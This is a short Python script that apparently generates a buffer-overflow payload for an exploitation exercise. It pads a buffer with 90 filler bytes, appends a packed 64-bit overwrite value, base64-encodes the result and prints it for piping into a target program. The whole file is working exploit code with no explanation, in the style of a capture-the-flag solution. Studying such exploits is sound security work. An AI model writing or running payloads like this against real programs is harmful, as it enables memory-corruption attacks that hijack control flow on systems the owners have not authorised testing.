
import sys
import struct
import base64

buf = b'llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll'
buf += struct.pack('<Q', 18096504807911055420)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
